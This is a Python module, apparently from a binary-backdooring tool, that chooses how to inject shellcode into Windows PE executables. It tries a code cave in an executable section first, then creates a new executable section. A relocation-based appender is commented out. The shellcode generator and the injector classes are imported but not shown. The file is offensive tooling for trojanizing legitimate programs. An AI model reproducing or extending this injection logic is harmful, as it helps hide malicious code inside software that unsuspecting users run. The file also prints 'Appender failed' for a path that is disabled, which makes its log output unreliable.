from BinaryModifiers.Win32SectionAppender import Win32SectionAppender
from BinaryModifiers.Win32SectionCreator import Win32SectionCreator
from BinaryModifiers.Win32SectionInjector import Win32SectionInjector
from Utils.Win32BinaryUtils import Win32BinaryUtils
from Utils.MultiByteHandler import MultiByteHandler
from Utils.Win32BinaryOffsetsAndSizes import  Win32BinaryOffsetsAndSizes

class Win32BinaryModifier:
    """
    class Win32BinaryModifier:
    Usage: Responsible for selecting specific modifiers:
     -Win32SectionInjector: when it is possible to inject the shellcode on the entrypoint section (e.g. section padding
     is big enough). CONSIDER CHECKING ALL EXECUTABL SECTIONS.
     -Win32SectionAppender: When a relocation table is available and the binary can be put on a different memory region
     from the one that is hardcoded on the header.
     -Win32SectionCreator: If the other cases fail, another section must be created with executable permissions.


    """

    def modify_binary(self):
        """
        :param self:
        :return:
        """
        header_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, Win32BinaryOffsetsAndSizes.OFFSET_TO_PE_HEADER_OFFSET)

        print("Testing Injector....")
        # We get a dummy shellcode. The size should remain the same
        shell_code = self.shell_code_generator.get_base_shell_code(0x0)
        (rva_for_region, raw_offset_for_region) = Win32BinaryUtils.get_executable_region_rva_and_raw_offset(self.binary_data, header_offset, len(shell_code))
        if rva_for_region != None and raw_offset_for_region != None:
            return Win32SectionInjector(self.binary_data, self.shell_code_generator, rva_for_region, raw_offset_for_region).modify_binary()

        #print("Injector failed. Testing Appender...") disable this and test with chrome...
        #if Win32BinaryUtils.has_relocation_table(self.binary_data):
        #    return Win32SectionAppender(self.binary_data, self.shell_code_generator).modify_binary()

        print("Appender failed. Testing Section Creator...")
        return Win32SectionCreator(self.binary_data, self.shell_code_generator).modify_binary()




    def __init__(self, binary_data, shell_code_generator):
       self.binary_data = binary_data
       self.shell_code_generator = shell_code_generator
